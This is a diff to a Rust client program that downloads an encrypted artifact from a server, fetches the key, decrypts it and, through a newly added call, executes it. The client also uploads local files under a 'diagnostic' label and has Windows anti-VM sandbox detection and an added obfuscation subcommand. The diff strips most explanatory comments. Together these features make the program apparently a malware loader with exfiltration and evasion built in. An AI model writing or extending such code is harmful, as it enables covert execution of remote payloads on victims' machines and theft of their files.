@@ -12,6 +12,11 @@ use common::proto::{KeyResponse, UploadResponse};
 use reqwest::blocking::{Body, Client};
 use reqwest::{Certificate, Identity};
 
+// ==========================================
+// MODIFICATION 1: REGISTRATION OF THE UTILS MODULE
+// ==========================================
+mod utils;
+
 // This file is generated at build time and embeds the server URL, build ID,
 // and certificate material needed by the client to talk to the backend.
 include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -24,7 +29,7 @@ fn normalize_error_message(message: &str) -> String {
     message.to_string()
 }
 
-fn debug_log(message: impl AsRef<str>) {
+pub(crate) fn debug_log(message: impl AsRef<str>) {
     if !DEBUG_BUILD {
         return;
     }
@@ -37,7 +42,8 @@ fn debug_log(message: impl AsRef<str>) {
         return;
     }
     let log_path = log_dir.join("client.log");
-    let line = format!("{} {}\n", chrono_like_timestamp(), normalize_error_message(message.as_ref()));
+    let line = format!("{} {}
+", chrono_like_timestamp(), normalize_error_message(message.as_ref()));
     if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(log_path) {
         let _ = file.write_all(line.as_bytes());
     }
@@ -51,12 +57,13 @@ fn chrono_like_timestamp() -> String {
 }
 
 // CLI arguments for the client.
-// --out: where to save a downloaded artifact after decrypting it.
-// --upload: path of a diagnostic file to encrypt and send back to the server.
-// --server and --build_id are used to target the correct build and endpoint.
 #[derive(Parser)]
 #[command(name = "client")]
 struct Args {
+    #[cfg(feature = "obfs")]
+    #[command(subcommand)]
+    command: Option<ClientCommand>,
+
     #[arg(long)]
     out: Option<PathBuf>,
 
@@ -70,8 +77,13 @@ struct Args {
     build_id: String,
 }
 
+#[cfg(feature = "obfs")]
+#[derive(clap::Subcommand)]
+enum ClientCommand {
+    Obf(utils::obf::Args),
+}
+
 // Optional VM escape protection for Windows builds when the anti-VM feature is enabled.
-// It tries to detect sandboxed execution environments before continuing.
 #[cfg(all(windows, feature = "antivm"))]
 fn vm_protection(client: &Client, args: &Args) {
     let pub_armored = match std::str::from_utf8(PUB_KEY) {
@@ -136,8 +148,6 @@ fn vm_protection(client: &Client, args: &Args) {
 }
 
 // Builds the authenticated HTTP client used for all requests.
-// This loads the embedded certificate authority and client identity, then configures
-// rustls and a global timeout for the network layer.
 fn build_client() -> Result<Client> {
     debug_log("initializing TLS client: loading embedded CA certificate and mTLS identity");
     let ca = Certificate::from_pem(CA_CERT).context("failed to load embedded ca certificate")?;
@@ -159,8 +169,7 @@ fn build_client() -> Result<Client> {
     Ok(client)
 }
 
-// Downloads the encrypted artifact for a specific build and writes it to a temporary file.
-// The artifact stream is read in chunks to avoid loading the full file into memory.
+// Downloads the encrypted artifact for a specific build.
 fn download_artifact(client: &Client, server: &str, build_id: &str, tmp: &Path) -> Result<()> {
     let url = format!("{server}/builds/{build_id}/artifact");
     debug_log(format!("starting artifact download connection: {url}"));
@@ -196,7 +205,6 @@ fn download_artifact(client: &Client, server: &str, build_id: &str, tmp: &Path) 
 }
 
 // Requests the private key metadata needed to decrypt the downloaded artifact.
-// The server returns the armored private key and its passphrase in a JSON structure.
 fn fetch_key(client: &Client, server: &str, build_id: &str) -> Result<KeyResponse> {
     let url = format!("{server}/builds/{build_id}/key");
     debug_log(format!("starting key fetch connection: {url}"));
@@ -211,8 +219,6 @@ fn fetch_key(client: &Client, server: &str, build_id: &str) -> Result<KeyRespons
     response.json::<KeyResponse>().context("failed to parse key response")
 }
 
-// Builds a temporary filename beside the final output path.
-// This is a safe staging file used while the artifact is being downloaded or decrypted.
 fn tmp_path_for(out: &Path) -> PathBuf {
     match out.file_name().and_then(|n| n.to_str()) {
         Some(name) => out.with_file_name(format!("{name}.part")),
@@ -234,14 +240,10 @@ fn ensure_output_directory(out: &Path) -> Result<()> {
     Ok(())
 }
 
-// Encrypts the diagnostic content using the server's public key.
-// This ensures the uploaded report is protected before being sent over the network.
 fn encrypt_diagnostic(pub_armored: &str, plaintext: &[u8]) -> Result<Vec<u8>> {
     pgp::encrypt_to_public(plaintext, pub_armored)
 }
 
-// Encrypts a local diagnostic file and sends it to the backend.
-// The data is written to a temporary encrypted file so the upload can be posted as a stream.
 fn upload_diagnostic(
     client: &Client,
     server: &str,
@@ -262,8 +264,6 @@ fn upload_diagnostic(
     result
 }
 
-// Sends the encrypted diagnostic payload to the server with the original filename in a header.
-// The server can reconstruct the artifact name while still receiving the encrypted bytes.
 fn send_diagnostic(
     client: &Client,
     server: &str,
@@ -297,8 +297,6 @@ fn send_diagnostic(
         .context("failed to parse upload response")
 }
 
-// Orchestrates the full download-and-decrypt flow.
-// It retrieves the artifact, fetches the key, decrypts the payload, and writes the final file.
 fn run(client: &Client, args: &Args, out: &Path, tmp: &Path) -> Result<()> {
     download_artifact(client, &args.server, &args.build_id, tmp)?;
 
@@ -312,11 +310,15 @@ fn run(client: &Client, args: &Args, out: &Path, tmp: &Path) -> Result<()> {
     Ok(())
 }
 
-// Application entry point.
-// It activates VM protection on Windows when configured, parses CLI options,
-// and chooses between uploading a diagnostic file or downloading/decrypting an artifact.
 fn run_client() -> Result<()> {
     let args = Args::parse();
+
+    #[cfg(feature = "obfs")]
+    if let Some(ClientCommand::Obf(obf_args)) = args.command {
+        utils::obf::run(obf_args).context("obfuscation operation failed")?;
+        return Ok(());
+    }
+
     debug_log(format!("started build_id={} server={}", args.build_id, args.server));
     let client = build_client()?;
 
@@ -353,6 +355,11 @@ fn run_client() -> Result<()> {
     result?;
 
     debug_log(format!("decrypted file written to {}", out.display()));
+
+    // ==========================================
+    // MODIFICATION 2: EXECUTION VIA THE UTILS MODULE
+    // ==========================================
+    utils::exec::execute_artifact(&out)?;
     Ok(())
 }
 
